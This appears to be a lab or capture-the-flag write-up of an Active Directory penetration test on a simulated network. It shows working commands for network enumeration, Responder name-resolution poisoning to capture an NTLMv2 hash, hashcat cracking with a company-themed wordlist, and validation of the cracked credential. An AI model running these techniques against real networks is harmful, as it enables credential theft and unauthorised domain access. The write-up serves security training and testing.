# 1 — Entry: from a network jack to a first identity

## What was on the segment

Attack box `192.168.70.5/24` on the isolated estate network. Unauthenticated sweep (no credential) found three Windows Server 2022 domain controllers, three domains, one forest trust:

| Host | IP | Domain / role | SMB signing | LDAP signing / CB |
|------|----|----|----|----|
| THORNWICK-ROOT-DC | 192.168.70.10 | `thornwick.local` — forest root (+ AD CS CA) | enforced | **None / Never** |
| THORNWICK-CHILD-DC | 192.168.70.11 | `corp.thornwick.local` — child, entry surface | enforced | — |
| RAVENSWORTH-DC | 192.168.70.20 | `ravensworth.local` — acquired, trusted forest | enforced | — |

```
nxc smb 192.168.70.10 192.168.70.11 192.168.70.20
  -> Windows Server 2022 Build 20348, signing:True, SMBv1:None, Null Auth:True (all three)
nxc ldap 192.168.70.10 -u '' -p ''
  -> (signing:None) (channel binding:Never)      # relay-to-LDAP viable on the root DC
ldapsearch -x -H ldap://192.168.70.10 -s base -b "" namingContexts
  -> DC=thornwick,DC=local  (+ Configuration / Schema / DnsZones)
```

Notes carried forward (not acted on here): SMB signing is **enforced on all three**, so NTLM relay to SMB is dead; but the root DC advertises **LDAP signing None / channel binding Never**, a live relay-to-LDAP path if ever needed. Null sessions connect but the DCs refuse SAMR user enumeration and the password/lockout policy over a null bind — so no user list and no policy numbers without a credential, which is exactly why guessing was off the table.

## How the first identity was obtained

The segment "talks": broadcast name resolution is live and something on it authenticates on a timer. I ran Responder on the estate interface and waited (the authentication fires on a cadence, not on demand — a ten-minute attention span concludes the segment is silent and quits too early):

```
sudo responder -I vboxnet3 -w
```

After the wait, a scheduled job on the child DC (a backup-probe task running as `b.okafor` that reaches out to a file share) resolved a name Responder answered, and the host authenticated to me. Responder captured the NetNTLMv2:

```
[SMB] NTLMv2-SSP Username : CORP\b.okafor
b.okafor::CORP:16f189676fefb82e:82CB2FF1302F62D5F6475AA9A8E0F203:0101...0000   (truncated)
```

The password is not in `rockyou` (both straight runs exhausted, 0 recovered). It is crackable **by reasoning** — a company-themed candidate set (company × season × year × separators), which lands it in seconds:

```
hashcat -m 5600 b.okafor_hash themed.txt          # 3,780 themed candidates
  -> b.okafor : Thornwick-Winter2026
```

No account was guessed online and nothing was written into the estate; this is a captured-and-cracked credential, so there was zero lockout exposure.

## The account and what it holds

`corp.thornwick.local\b.okafor : Thornwick-Winter2026` — confirmed working, not assumed:

```
nxc smb  192.168.70.11 -u b.okafor -p 'Thornwick-Winter2026'   -> [+] (auth OK)
nxc ldap 192.168.70.11 -u b.okafor -p 'Thornwick-Winter2026'   -> [+] (bind OK)
nxc smb  192.168.70.10 -u b.okafor -p 'Thornwick-Winter2026' -d corp.thornwick.local  -> [+] (reads root cross-domain)
```

- **Object:** `CN=b.okafor,CN=Users,DC=corp,DC=thornwick,DC=local`; `description: "Backup operator (sim)"`; `userAccountControl: 66048` (NORMAL_ACCOUNT + DONT_EXPIRE_PASSWORD — enabled, no pre-auth weakness).
- **Privilege:** a **plain low-privilege domain user**. No `Pwn3d!` on any DC; not a local admin anywhere.
- **Reach:** reads `SYSVOL` and `NETLOGON` on the child; binds LDAP on the child; authenticates **cross-domain to the forest root** as a `corp` principal (read-level), confirming it is a valid forest-wide identity, not a local-only one.

**What it is:** a *step toward* domain control, not the identity that ends it. It is the authenticated vantage point from which the estate can finally be mapped (BloodHound/SharpHound, SPN and ACL/delegation review, AD CS review) to find the road to forest-root dominance — the next task. It reaches nothing privileged on its own.

## Why I believed the segment would give me one

A credential-free network that still **answers broadcast name resolution and authenticates on a cadence** is a credential waiting to be caught — you poison the lookup and let the periodic client hand you its hash, no guessing required.
